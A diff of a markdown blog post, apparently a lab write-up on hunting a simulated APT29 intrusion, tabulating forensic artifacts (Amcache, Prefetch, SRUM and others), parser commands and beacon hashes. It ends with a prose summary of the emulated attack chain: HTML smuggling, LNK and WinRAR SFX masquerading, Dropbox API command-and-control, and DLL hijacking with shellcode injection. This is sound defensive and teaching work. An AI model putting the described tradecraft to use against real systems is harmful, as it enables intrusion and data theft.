+| `4344.exe` / `4344.EXE-4A79C548.pf` | 2025-12-03 12:53:00 | 2025-12-03 12:53:00 | 2025-12-03 12:54:39 | First beacon; has prefetch |
+| `APT-shtask.ps1` | 2025-12-02 18:03:35 | 2025-12-02 18:03:35 | 2025-12-02 18:09:35 | Scheduled-task script |
+| `SystemUpdate` | 2025-12-03 15:03:21 | 2025-12-03 15:03:21 | 2025-12-05 17:35:54 | `.\Windows\System32\Tasks` |
+| `OneDrive.exe` | 2025-12-02 14:50:42 | 2025-12-02 14:50:42 | — | 19,456 B; `ONEDRIVE.EXE-9BD2FBB9.pf` |
 
-User: DESKTOP-M8AP5P7\Victim-Machine
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-168.png" width="380" alt="MFT artifacts"/></td><td><img src="/assets/img/posts/apt29-hunting/img-175.png" width="380" alt="MFT artifacts"/></td></tr>
+</table>
 
-User SID: S-1-5-21-1064308082-3896131167-3449499780-1001
+#### Amcache
 
-Source Host Name: DESKTOP-M8AP5P7
+> **Note:** when transferring the Amcache from KAPE, include the `Amcache.hve.LOG1` and `Amcache.hve.LOG2` files.
 
-RuleName: User Mode
-
-Destination IP: 192.168.253.148 (Kali IP)
-
-Initiating Process:
-
-rundll32.exe
-
-## T1071.001.exe
-
-OneDrive.exe
-
-4344.exe
-
-Now lets move to Event ID 11: (File Creation)
-
-Here we will find the file written in the drive and how it created:
-
-APT-shtask.ps1 => Created by rundll32.exe
-
-![](/assets/img/posts/apt29-hunting/img-153.png)
-
-![](/assets/img/posts/apt29-hunting/img-154.png)
-
-While i was simulating i transferred the file using ez way to save the time which also will be found
-
-![](/assets/img/posts/apt29-hunting/img-155.png)
-
-![](/assets/img/posts/apt29-hunting/img-156.png)
-
-![](/assets/img/posts/apt29-hunting/img-157.png)
-
-Now we will move to powershell logging detection:
-
-![](/assets/img/posts/apt29-hunting/img-158.png)
-
-First thing we can see here is enable script logging:
-
-ScriptBlockText: Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging - Name EnableScriptBlockLogging -Value 1 -Force
-
-ScriptBlockText: New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" - Force | Out-Null
-
-![](/assets/img/posts/apt29-hunting/img-159.png)
-
-![](/assets/img/posts/apt29-hunting/img-160.png)
-
-Schedule task creations:
-
-![](/assets/img/posts/apt29-hunting/img-161.png)
-
-Web requests we done b4
-
-![](/assets/img/posts/apt29-hunting/img-162.png)
-
-Kape Analysis:
-
-We will use 2 modules for analysis
-
-MiniTimelineCollection
-
-!SANS_Triage
-
-![](/assets/img/posts/apt29-hunting/img-163.png)
-
-![](/assets/img/posts/apt29-hunting/img-164.png)
-
-Full KAPE Command will be:
-
-.\kape.exe --tsource C: --tdest "C:\Users\Victim-Machine\Desktop\Kape Results" - -tflush --target !SANS_Triage,MiniTimelineCollection --gui
-
-Lets start with $MFT File:
-
-![](/assets/img/posts/apt29-hunting/img-165.png)
-
-Will use MFTECmd.exe to parse the events on file into CSV visible file
-
-I transferred it to Forensics Machine to use the tool there
-
-Command used:
-
-C:\Users\Subzero\Desktop\EricZimmer Tools\EricZimmer Tools>MFTECmd.exe -f "C:\Users\Subzero\Desktop$MFT" --csv "C:\Users\Subzero\Desktop"
-
-![](/assets/img/posts/apt29-hunting/img-166.png)
-
-Lets open it on Timeline Exploler
-
-![](/assets/img/posts/apt29-hunting/img-167.png)
-
-![](/assets/img/posts/apt29-hunting/img-168.png)
-
-After multiple searches i found the first beacon "433.exe" details:
-
-![](/assets/img/posts/apt29-hunting/img-169.png)
-
-![](/assets/img/posts/apt29-hunting/img-170.png)
-
-Lets see what data we have:
-
-File Name:
-
-4344.exe
-
-4344.EXE-4A79C548.pf
-
-File have pf files (will use in prefetch file analysis)
-
-Creation Date: 2025-12-03 12:53:00
-
-Modification Date: 2025-12-03 12:53:00 (once installed no further edits on it)
-
-Last Access Date: 2025-12-03 12:54:39
-
-Source File: C:\Users\Subzero\Desktop$MFT
-
-.ps1 file act as schedule task:
-
-![](/assets/img/posts/apt29-hunting/img-171.png)
-
-![](/assets/img/posts/apt29-hunting/img-172.png)
-
-![](/assets/img/posts/apt29-hunting/img-173.png)
-
-File Name: APT-shtask.ps1
-
-Creation Date: 2025-12-02 18:03:35
-
-Modification Date: 2025-12-02 18:03:35 (once installed no further edits on it)
-
-Last Access Date: 2025-12-02 18:09:35
-
-Source File: C:\Users\Subzero\Desktop$MFT
-
-Systemupdate task:
-
-![](/assets/img/posts/apt29-hunting/img-174.png)
-
-File Name: SystemUpdate
-
-File Path:.\Windows\System32\Tasks
-
-File Creation Date: 2025-12-03 15:03:21
-
-Last Modification Date: 2025-12-03 15:03:21
-
-Last Access: 2025-12-05 17:35:54
-
-Source File: C:\Users\Subzero\Desktop$MFT
-
-OneDrive.exe
-
-![](/assets/img/posts/apt29-hunting/img-175.png)
-
-File Name: OneDrive.exe
-
-File Path:.\Users\Victim-Machine\Desktop
-
-File Size: 19456B
-
-Creation Date: 2025-12-02 14:50:42
-
-Last Modifications: 2025-12-02 14:50:42 pf files:
-
-ONEDRIVE.EXE-9BD2FBB9.pf
-
-Now we saw the file, we want to see if its executed or not
-
-Here we have 3 options:
-
-Amcache
-
-Shimcache
-
-Prefetch
-
-Amcache:
-
-KAPE helped us as its already extracted it
-
-Path: C > Windows > AppCompat > Programs > Amcache.hve
-
-![](/assets/img/posts/apt29-hunting/img-176.png)
-
-we will use Amcache Parser Tool to extract the data we want in CSV file
-
-Transferred into forensics machine
-
-NOTE "While transferring the amcache from KAPE, you should analyze the file with LOG file"
-
-Amcache.hve.LOG1
-
-Amcache.hve.LOG2
-
-![](/assets/img/posts/apt29-hunting/img-177.png)
-
-CommandLine used:
-
+Path: `C > Windows > AppCompat > Programs > Amcache.hve`. Parse with **AmcacheParser**:
+```text
 AmcacheParser.exe -f "C:\Users\Subzero\Desktop\Programs\Amcache.hve" --csv "C:\Users\Subzero\Desktop"
-
-![](/assets/img/posts/apt29-hunting/img-178.png)
-
-![](/assets/img/posts/apt29-hunting/img-179.png)
-
-Now we got 6 files
-
-Amcache1
-
-Amcache2
-
-Amcache3
-
-Amcache4
-
-Amcache5
-
-Amcache6 lets analyze each one separately
-
-Amcache1:
-
-![](/assets/img/posts/apt29-hunting/img-180.png)
-
-![](/assets/img/posts/apt29-hunting/img-181.png)
-
-Here there is no artifacts observed, its normal files on the device
-
-Its not about executed programs; it is the “Device Containers” view from the Amcache hive, describing hardware and virtual devices configured/seen on the system (NIC, audio, monitor, USB hub, printers, etc.), with status and metadata
-
-Amcache2:
-
-![](/assets/img/posts/apt29-hunting/img-182.png)
-
-![](/assets/img/posts/apt29-hunting/img-183.png)
-
-![](/assets/img/posts/apt29-hunting/img-184.png)
-
-Also no execution artifacts
-
-It is the “Device Classes” or “Device Stack” view from the Amcache hive. It contains detailed metadata about every device, driver, and service stack present on the system, including hardware, virtual devices, and software components
-
-Logs every device class, driver, and service stack that Windows knows about for each hardware/software component, including installation dates, driver versions, and driver stack relationships.
-
-Amcache3:
-
-![](/assets/img/posts/apt29-hunting/img-185.png)
-
-![](/assets/img/posts/apt29-hunting/img-186.png)
-
-![](/assets/img/posts/apt29-hunting/img-187.png)
-
-![](/assets/img/posts/apt29-hunting/img-188.png)
-
-Again no any executions
-
-Drivers” view from the Amcache hive. It contains detailed information about every driver installed on the system, including their file paths, installation timestamps, version numbers, and metadata such as company, driver type, and service associations
-
-Amcache4:
-
-![](/assets/img/posts/apt29-hunting/img-189.png)
-
-![](/assets/img/posts/apt29-hunting/img-190.png)
-
-It contains information about the INF files used to install drivers on the system, including the package name, installation date, associated hardware IDs, and the drivers included in each package.
-
-Amcache5:
-
-![](/assets/img/posts/apt29-hunting/img-191.png)
-
-![](/assets/img/posts/apt29-hunting/img-192.png)
-
-Here is the “Lnk Files” view from the Amcache hive. It contains information about shortcut (.lnk) files that Windows knows about, including the shortcut name, the target path, and the last write timestamp
-
-Logs every shortcut file that Windows has encountered, including those in the Start Menu, user directories, and pinned items.
-
-Each row represents a shortcut file, with the following columns:
-
-KeyName
-
-LnkName
-
-KeyLastWriteTimestamp
-
-Btw u can check path called "c:\users\victim- machine\AppData\Roaming\Microsoft\Windows\Start Menu" this might be a place where attacker try to stay on the system
-
-Amcache6:
-
-![](/assets/img/posts/apt29-hunting/img-193.png)
-
-![](/assets/img/posts/apt29-hunting/img-194.png)
-
-![](/assets/img/posts/apt29-hunting/img-195.png)
-
-Here is FINALYYY!! the “Programs” or “Executables” view from the Amcache hive. It contains detailed information about every executable (EXE, DLL, etc.) that Windows has encountered, including file paths, hashes, timestamps, version information
-
-Lets now dig deep and extract the following from beacons:
-
-beacon name beacon path beacon hash last time file accessed by user
-
-File Name: 4344.exe
-
-File Hash: d0fb209cc582e42ff0ff3bfbc40f88ede8469db5
-
-File Path: c:\users\victim-machine\desktop\4344.exe
-
-Last Time Accessed: 2025-12-03 12:54:11
-
-File Size: 19456B
-
-File Name: evil.exe
-
-File Hash: 206650c4dee86d38d06e1840d13df6555ffaf69a
-
-File Path: c:\users\victim-machine\appdata\local\temp\rade33f6.tmp\evil.exe ( this file dropped in %TMP% folder as u can see in initial malware staging )
-
-Last Time Accessed: 2025-12-02 05:59:30
-
-File Size: 14848B
-
-File Name: t1071.001.exe
-
-File Hash: c250e1c70123cb4a78a41d99c29957119d07a917
-
-File Path: c:\users\victim-machine\desktop\t1071.001.exe
-
-Last Time Accessed: 2025-12-04 09:07:40
-
-File Size: 19434B
-
-File Name: onedrive.exe
-
-File Path: c:\users\victim-machine\desktop\onedrive.exe
-
-File Hash: 559f7bc823af4ef757092e1c2bd439a3f5fc2e60
-
-Last Time Accessed: 2025-12-03 12:18:05
-
-File Size: 19456B
-
-File Name: healthy_stitch.exe
-
-File Path: c:\users\victim-machine\desktop\healthy_stitch.exe
-
-File Hash: 559f7bc823af4ef757092e1c2bd439a3f5fc2e60
-
-Last Time Accessed: 2025-12-01 10:01:18
-
-File Size: 14848B
-
-Now we will go to use shimcache to double check on the evidences:
-
-shimcache will be found in SYSTEM Hive
-
-Kape will drop it in "C:\Users\Victim-Machine\Desktop\Kape Results\C\Windows\system32\config\SYSTEM"
-
-We will use AppCompatCache Parser tool to extract the shimcache from this file ( WE need LOG1 and LOG2 files with the SYSTEM hive )
-
-![](/assets/img/posts/apt29-hunting/img-196.png)
-
-It contains a list of executables that Windows has attempted to run, along with their last modified timestamps, whether they were executed, and the source registry hive from which the entry was extracted
-
-![](/assets/img/posts/apt29-hunting/img-197.png)
-
-![](/assets/img/posts/apt29-hunting/img-198.png)
-
-![](/assets/img/posts/apt29-hunting/img-199.png)
-
-Also can be checked by Registry Forensics: SYSTEM => ControlSet001 => Control => Session Manager =>AppCompatCache
-
-![](/assets/img/posts/apt29-hunting/img-200.png)
-
-Lets now go to check Prefetch Files:
-
-Prefetch file is the confirmation 100% of execution, other artifacts might be modified
-
-KAPE extracted the PF file in " C:\Users\Victim-Machine\Desktop\Kape
-
-Results\C\Windows\prefetch "
-
-![](/assets/img/posts/apt29-hunting/img-201.png)
-
-![](/assets/img/posts/apt29-hunting/img-202.png)
-
-![](/assets/img/posts/apt29-hunting/img-203.png)
-
-Now we will use PECmd.exe to extract data to CSV file
-
-![](/assets/img/posts/apt29-hunting/img-204.png)
-
-Lets start the analysis:
-
-CommandLine:
-
-PECmd.exe -d "C:\Users\Subzero\Desktop\prefetch" --csv
-
-"C:\Users\Subzero\Desktop"
-
-![](/assets/img/posts/apt29-hunting/img-205.png)
-
-![](/assets/img/posts/apt29-hunting/img-206.png)
-
-Now we have the following:
-
-Source File Name
-
-Source Created
-
-Source Modification
-
-Executable Name
-
-Size
-
-Last Run
-
-![](/assets/img/posts/apt29-hunting/img-207.png)
-
-![](/assets/img/posts/apt29-hunting/img-208.png)
-
-![](/assets/img/posts/apt29-hunting/img-209.png)
-
-Now we can confirm 100% of malicious executions
-
-I will no repeat my self again u can check the data above i will just drop the.pf files:
-
-C:\Users\Subzero\Desktop\prefetch\4344.EXE-4A79C548.pf (Run Count: 3)
-
-C:\Users\Subzero\Desktop\prefetch\ARTIFACT_X64.EXE-A673DF30.pf (Run Count: 6)
-
-C:\Users\Subzero\Desktop\prefetch\T1071.001.EXE-0C2CD751.pf (Run Count: )
-
-C:\Users\Subzero\Desktop\prefetch\DLLHOST.EXE-504C779A.pf (Run Count: 7)
-
-C:\Users\Subzero\Desktop\prefetch\POWERSHELL.EXE-920BBA2A.pf (Run Count: 29)
-
-C:\Users\Subzero\Desktop\prefetch\EVIL.EXE-07B0B829.pf (Run Count: 6)
-
-C:\Users\Subzero\Desktop\prefetch\WHOAMI.EXE-B8288E39.pf (Run Count: 8)
-
-C:\Users\Subzero\Desktop\prefetch\HOSTNAME.EXE-D4E60423.pf (Run Count: 1)
-
-Source Time (Execution Time) Between:
-
-2025-12-02 14:50:08
-
-2025-12-06 14:56:15
-
-SRUM Collection:
-
-We need to track application and system resource usage like network activity, energy consumption, and process execution
-
-KAPE drops SRUM here "C:\Users\Victim-Machine\Desktop\Kape Results\C\Windows\system32\SRU"
-
-Will use SrumECmd.exe to extract the data into csv file
-
-CommandLine:
-
+```
+This produces **six** CSV views:
+
+| View | Content | Execution artifacts? |
+|------|---------|----------------------|
+| **Amcache1** | Device Containers (NIC, audio, monitor, USB, printers) | ❌ No |
+| **Amcache2** | Device Classes / Device Stack (drivers, services) | ❌ No |
+| **Amcache3** | Drivers (paths, install times, versions) | ❌ No |
+| **Amcache4** | Driver-package INF files (hardware IDs) | ❌ No |
+| **Amcache5** | LNK files (shortcut name, target path, last write) | ⚠️ Indirect |
+| **Amcache6** | **Programs / Executables** (paths, hashes, timestamps, versions) | ✅ **Yes** |
+
+> 💡 **Amcache5 tip:** check `c:\users\victim-machine\AppData\Roaming\Microsoft\Windows\Start Menu` — a common location for persistence.
+
+<table>
+<tr>
+<td align="center"><b>Amcache1 — Device Containers</b><br><img src="/assets/img/posts/apt29-hunting/img-176.png" width="300" alt="amcache1"/><br><img src="/assets/img/posts/apt29-hunting/img-178.png" width="300" alt="amcache1"/><br><img src="/assets/img/posts/apt29-hunting/img-179.png" width="300" alt="amcache1"/></td>
+<td align="center"><b>Amcache2 — Device Classes</b><br><img src="/assets/img/posts/apt29-hunting/img-180.png" width="300" alt="amcache2"/><br><img src="/assets/img/posts/apt29-hunting/img-181.png" width="300" alt="amcache2"/></td>
+</tr>
+<tr>
+<td align="center"><b>Amcache3 — Drivers</b><br><img src="/assets/img/posts/apt29-hunting/img-182.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-183.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-184.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-185.png" width="300" alt="amcache3"/></td>
+<td align="center"><b>Amcache4 — Driver Packages (INF)</b><br><img src="/assets/img/posts/apt29-hunting/img-186.png" width="300" alt="amcache4"/><br><img src="/assets/img/posts/apt29-hunting/img-187.png" width="300" alt="amcache4"/></td>
+</tr>
+<tr>
+<td align="center"><b>Amcache5 — LNK Files</b><br><img src="/assets/img/posts/apt29-hunting/img-188.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-189.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-190.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-191.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-192.png" width="300" alt="amcache5"/></td>
+<td align="center"><b>Amcache6 — Programs / Executables</b><br><img src="/assets/img/posts/apt29-hunting/img-193.png" width="300" alt="amcache6"/><br><img src="/assets/img/posts/apt29-hunting/img-194.png" width="300" alt="amcache6"/><br><img src="/assets/img/posts/apt29-hunting/img-195.png" width="300" alt="amcache6 programs"/><br><img src="/assets/img/posts/apt29-hunting/img-196.png" width="200" alt="amcache6 beacon detail"/></td>
+</tr>
+</table>
+
+**Beacons extracted from Amcache6 (Programs view):**
+
+| File | SHA-1 hash | Path | Last accessed | Size |
+|------|-----------|------|---------------|------|
+| `4344.exe` | `d0fb209cc582e42ff0ff3bfbc40f88ede8469db5` | `c:\users\victim-machine\desktop\4344.exe` | 2025-12-03 12:54:11 | 19,456 B |
+| `evil.exe` | `206650c4dee86d38d06e1840d13df6555ffaf69a` | `...\appdata\local\temp\rade33f6.tmp\evil.exe` | 2025-12-02 05:59:30 | 14,848 B |
+| `t1071.001.exe` | `c250e1c70123cb4a78a41d99c29957119d07a917` | `c:\users\victim-machine\desktop\t1071.001.exe` | 2025-12-04 09:07:40 | 19,434 B |
+| `onedrive.exe` | `559f7bc823af4ef757092e1c2bd439a3f5fc2e60` | `c:\users\victim-machine\desktop\onedrive.exe` | 2025-12-03 12:18:05 | 19,456 B |
+| `healthy_stitch.exe` | `559f7bc823af4ef757092e1c2bd439a3f5fc2e60` | `c:\users\victim-machine\desktop\healthy_stitch.exe` | 2025-12-01 10:01:18 | 14,848 B |
+
+> Note: `evil.exe` dropped in `%TMP%` is consistent with initial malware staging.
+
+#### Shimcache (AppCompatCache)
+
+Found in the **SYSTEM** hive: `...\Kape Results\C\Windows\system32\config\SYSTEM` (needs `LOG1` + `LOG2`). Parse with **AppCompatCacheParser**. Shimcache lists executables Windows attempted to run with last-modified timestamps and source hive. Can also be read via Registry: `SYSTEM → ControlSet001 → Control → Session Manager → AppCompatCache`.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-197.png" width="380" alt="shimcache"/></td><td><img src="/assets/img/posts/apt29-hunting/img-198.png" width="380" alt="shimcache"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-199.png" width="380" alt="shimcache"/></td><td><img src="/assets/img/posts/apt29-hunting/img-200.png" width="380" alt="shimcache"/></td></tr>
+</table>
+
+#### Prefetch — 100% Execution Confirmation
+
+> Prefetch is the strongest proof of execution; other artifacts can be modified.
+
+KAPE extracts PF files to `...\Kape Results\C\Windows\prefetch`. Parse with **PECmd**:
+```text
+PECmd.exe -d "C:\Users\Subzero\Desktop\prefetch" --csv "C:\Users\Subzero\Desktop"
+```
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-201.png" width="380" alt="prefetch"/></td><td><img src="/assets/img/posts/apt29-hunting/img-202.png" width="380" alt="prefetch"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-203.png" width="380" alt="prefetch"/></td><td><img src="/assets/img/posts/apt29-hunting/img-205.png" width="380" alt="prefetch"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-206.png" width="380" alt="PECmd output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-207.png" width="380" alt="PECmd output"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-208.png" width="380" alt="PECmd output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-209.png" width="380" alt="PECmd output"/></td></tr>
+</table>
+
+**Confirmed executions (run counts):**
+
+| Prefetch file | Run count |
+|---------------|-----------|
+| `4344.EXE-4A79C548.pf` | 3 |
+| `ARTIFACT_X64.EXE-A673DF30.pf` | 6 |
+| `T1071.001.EXE-0C2CD751.pf` | — |
+| `DLLHOST.EXE-504C779A.pf` | 7 |
+| `POWERSHELL.EXE-920BBA2A.pf` | 29 |
+| `EVIL.EXE-07B0B829.pf` | 6 |
+| `WHOAMI.EXE-B8288E39.pf` | 8 |
+| `HOSTNAME.EXE-D4E60423.pf` | 1 |
+
+Execution window: **2025-12-02 14:50:08 → 2025-12-06 14:56:15**.
+
+#### SRUM — System Resource Usage Monitor
+
+Tracks application/system resource usage (network, energy, process execution). KAPE drops it at `...\Kape Results\C\Windows\system32\SRU`. Parse with **SrumECmd**:
+```text
 SrumECmd.exe -f "C:\Users\Subzero\Desktop\SRUDB.dat" --csv C:\Users\Subzero\Desktop\
-
-SrumECmd.exe -d "C:\Users\Subzero\Desktop\SRU" --csv C:\Users\Subzero\Desktop\
-
-![](/assets/img/posts/apt29-hunting/img-210.png)
-
-![](/assets/img/posts/apt29-hunting/img-211.png)
-
-Now we extracted files known for the following:
-
-ApplicationResourceUsage.csv
-
-NetworkConnectivity.csv
-
-EnergyUsage.csv
-
-NetworkUsage.csv
-
-Timeline.csv
-
-Process Resource Usage
-
-Lets Start
-
-Srum1-SrumECmd_AppResourceUseInfo_Output
-
-![](/assets/img/posts/apt29-hunting/img-212.png)
-
-![](/assets/img/posts/apt29-hunting/img-213.png)
-
-Here will see each app how it uses the resources on the device
-
-File Name: T1071.001.exe
-
-Face Time: 109206880000
-
-Foreground Bytes: 2344960
-
-File Name: evil.exe
-
-Face Time: 36600150000
-
-Foreground Bytes: 1638400
-
-Srum2-SrumECmd_AppTimelineProvider_Output
-
-![](/assets/img/posts/apt29-hunting/img-214.png)
-
-Here we will find the evidence for file and commandline like:
-
-net1 (creating the user)
-
-whoami hostname
-
+SrumECmd.exe -d "C:\Users\Subzero\Desktop\SRU"     --csv C:\Users\Subzero\Desktop\
 ```
-schtasks.exe (by user => S-1-5-21-1064308082-3896131167-
-3449499780-1001)
+Outputs: `ApplicationResourceUsage`, `NetworkConnectivity`, `EnergyUsage`, `NetworkUsage`, `Timeline`.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-210.png" width="380" alt="SRUM"/></td><td><img src="/assets/img/posts/apt29-hunting/img-211.png" width="380" alt="SRUM"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-212.png" width="380" alt="SRUM"/></td><td><img src="/assets/img/posts/apt29-hunting/img-214.png" width="380" alt="SRUM timeline"/></td></tr>
+</table>
+
+**App Resource Usage:**
+
+| File | Face Time | Foreground Bytes |
+|------|-----------|------------------|
+| `T1071.001.exe` | 109,206,880,000 | 2,344,960 |
+| `evil.exe` | 36,600,150,000 | 1,638,400 |
+
+**App Timeline Provider** captured: `net1` (user creation), `whoami`, `hostname`, `schtasks.exe`, and PowerShell executions — all tied to SID `S-1-5-21-1064308082-3896131167-3449499780-1001`.
+
+<img src="/assets/img/posts/apt29-hunting/img-213.png" width="400" alt="SRUM timeline"/> <img src="/assets/img/posts/apt29-hunting/img-216.png" width="400" alt="SRUM"/> <img src="/assets/img/posts/apt29-hunting/img-217.png" width="400" alt="SRUM network"/>
+
+**Network Usage (real connections):**
+
+| Process | Bytes Sent | Bytes Received |
+|---------|-----------|----------------|
+| `t1071.001.exe` | 83,338,496 | 65,592,861 |
+| `evil.exe` | 42,709 | 150,474 |
+| `invite for attack.hta.exe` | 48,564 | 224,350 |
+| `OneDrive.exe` | 28,245 | 201,581 |
+| `rundll32.exe` *(unusual volume)* | 194,044 | 44,699 |
+
+Interface: `IF_TYPE_ETHERNET_CSMACD` · Interface LUID: `1689399632855040`.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-218.png" width="380" alt="network usage"/></td><td><img src="/assets/img/posts/apt29-hunting/img-219.png" width="380" alt="network usage"/></td></tr>
+</table>
+
+---
+
+## 9 · Attachment-Drop Technique (Full Chain Emulation)
+
+> 📎 Emulation references: [carbonblack/tau-tools Invoke-APT29](https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke-APT29/apt29.ps1) · [S3N4T0R-0X0/APT29-Adversary-Simulation](https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation)
+
+This chain mirrors APT29's documented DOCX → HTML-smuggling → ISO/LNK → image-execution → cloud-C2 flow.
+
+| Stage | Technique | Detail |
+|-------|-----------|--------|
+| **1. DOCX (Initial Access)** | Embedded hyperlink | A malicious DOCX contains a hidden hyperlink that silently downloads an external HTML file. The link does not appear in the document text, evading user suspicion. |
+| **2. HTML Smuggling** | Conceal ISO | The HTML file embeds a Base64-encoded ISO (`base64 payload.iso -w 0`). The browser reconstructs and downloads it locally, bypassing network detection. Phishing text + a BMW car image reinforce the lure. |
+| **3. ISO + LNK Abuse** | Masquerading | The ISO contains LNK files masquerading as images. When run, they launch a legitimate executable, display a decoy PNG, and load encrypted shellcode into memory (decrypted at runtime). |
+| **4. Image-Based Execution** | WinRAR SFX | A crafted PNG (legit BMW visuals) hides a WinRAR self-extracting archive configured to run a command on extraction; the archive icon is swapped for an image icon. A shortcut is packaged with legit images into an ISO via PowerISO. |
+| **5. Payload Execution** | Run-after-extract | WinRAR's "Run after extraction" (Advanced SFX) executes the payload automatically when the victim opens the ISO. The victim believes they're viewing BMW images while the payload runs simultaneously. |
+| **6. Dropbox C2** | Cloud relay | The Dropbox API is used as the C2 channel, blending traffic into legitimate cloud usage. The access token is AES-ECB encrypted (16/24/32-byte key), Base64-encoded, and embedded in the payload. A Python test payload validated connectivity first. |
+| **7. DLL Hijacking + Shellcode Injection** | Stealth exec | A malicious DLL loads instead of a legitimate one (improper search-order handling); shellcode runs from `DllMain`. |
+| **8. Final Payload** | C2 + exfil | Establishes outbound comms with the Dropbox API C2 (optionally primary/secondary C2 via Microsoft Graph API) and uploads collected data and command output. |
+
+**DLL-hijacking execution flow:**
+
+```text
+DLL Hijacking      → malicious DLL loaded via improper search-order handling
+Shellcode Exec     → shellcode stored in the DLL, executed via DllMain
+Memory Allocation  → VirtualAlloc allocates executable memory in the target process
+Shellcode Inject   → memcpy copies shellcode into allocated memory
+Priv Inheritance   → if target runs elevated, injected shellcode inherits privileges
+Fault Tolerance    → if the DLL fails to load, log a warning and continue
 ```
 
-![](/assets/img/posts/apt29-hunting/img-215.png)
-
-any powershell execution done by compromised user (S-1-5-21- 1064308082-3896131167-3449499780-1001)
-
-![](/assets/img/posts/apt29-hunting/img-216.png)
-
-Also i can identify when the file executed and last time execution and track the period from it
-
-Srum5-NetworkUsages_Output:
-
-Process that did a real network connection
-
-![](/assets/img/posts/apt29-hunting/img-217.png)
-
-![](/assets/img/posts/apt29-hunting/img-218.png)
-
-![](/assets/img/posts/apt29-hunting/img-219.png)
-
-Processes:
-
-t1071.001.exe:
-
-Bytes Sent: 83338496
-
-Bytes Received: 65592861 evil.exe:
-
-Bytes Sent: 42709
-
-Bytes Received: 150474 invite for attack.hta.exe:
-
-Bytes Sent: 48564
-
-Bytes Received: 224350
-
-OneDrive.exe
-
-Bytes Sent: 28245
-
-Bytes Received: 201581 rundll32.exe ( that one which has unusual amount of data )
-
-Bytes Sent: 194044
-
-Bytes Received: 44699
-
-Interface Type:
-
-IF_TYPE_ETHERNET_CSMACD
-
-Interface Luid:
-
-1689399632855040
-
-Full simulation by ps script:
-
-https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke- APT29/apt29.ps1
-
-Analysis for Attachment drop technique; https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation
-
-Quick Summary:
-
-1. DOCX File (Initial Access)
-
-The attack begins with a malicious DOCX document containing an embedded hyperlink. When clicked, the hyperlink silently downloads an external HTML file that serves as the next stage of the attack via HTML smuggling.
-
-The key advantage of using a hyperlink is that it does not appear directly in the document text, helping the attackers evade user suspicion.
-
-2. HTML Smuggling
-
-The downloaded HTML file employs HTML smuggling techniques to conceal an ISO file.
-
-The ISO payload is Base64-encoded (e.g., base64 payload.iso -w 0 ) and embedded directly within the HTML file. When rendered, the browser reconstructs and downloads the ISO locally, bypassing traditional network-based detection.
-
-To increase credibility, the HTML page includes phishing text and a BMW car image, aligning with the social engineering theme of the campaign.
-
-3. ISO File and LNK Abuse
-
-The reconstructed ISO file contains multiple LNK (shortcut) files masquerading as image files.
-
-When executed, these LNK files:
-
-Launch a legitimate executable
-
-Display a decoy PNG image to the victim
-
-Secretly load encrypted shellcode into memory, which is then decrypted at runtime
-
-This technique ensures user deception while executing the malicious payload in the background.
-
-4. Image-Based Execution (Second Stage – Implantation)
-
-A specially crafted PNG image is used as a delivery mechanism. While the image displays legitimate BMW visuals, opening it triggers malicious activity in the background.
-
-Using WinRAR SFX (self-extracting archive):
-
-A command-line payload is configured to execute automatically upon extraction
-
-The archive icon is replaced with an image icon to maintain visual deception
-
-A shortcut to this archive is then embedded alongside legitimate images and packaged into an ISO file using PowerISO.
-
-- **Note:** This ISO file is later Base64-encoded and embedded into the HTML smuggling file, which is linked inside the DOCX document.
-
-5. Payload Execution (Third Stage)
-
-Because the command execution is configured under “Run after extraction” in WinRAR’s Advanced SFX options, the payload is executed automatically when the victim opens the ISO file.
-
-From the victim’s perspective:
-
-They believe they are opening high-quality BMW images
-
-In reality, the malicious payload executes simultaneously with the image display
-
-6. Dropbox C2 Channel (Fourth Stage – Data Exfiltration)
-
-The attackers leverage the Dropbox API as a Command and Control (C2) channel.
-
-By using Dropbox
-
-Malicious traffic blends into legitimate cloud service traffic
-
-Detection becomes significantly more difficult for security teams
-
-The attackers
-
-Create a Dropbox account and enable API permissions
-
-Generate an access token
-
-Encrypt the token using AES (ECB mode) with a user-supplied key (16/24/32 bytes)
-
-Base64-encode the encrypted token for use in the payload
-
-A Python-based test payload was initially used to validate Dropbox connectivity before deploying the full malware. 7. DLL Hijacking and Shellcode Injection (Fifth Stage)
-
-The final payload uses DLL hijacking to execute malicious code within a legitimate process.
-
-Execution Flow
-
-DLL Hijacking
-
-A malicious DLL is loaded instead of a legitimate one due to improper DLL search order handling.
-
-Shellcode Execution
-
-The shellcode is stored inside the malicious DLL and executed via the DllMain function.
-
-Memory Allocation
-
-The payload uses VirtualAlloc to allocate executable memory within the target process.
-
-Shellcode Injection
-
-The shellcode is copied into the allocated memory using memcpy.
-
-Privilege Inheritance
-
-If the target process runs with elevated privileges, the injected shellcode inherits those privileges, enabling higher-impact actions.
-
-If the malicious DLL fails to load, the payload logs a warning and continues execution without terminating. 8. Final Payload Execution
-
-After successful decryption and in-memory loading, the final payload:
-
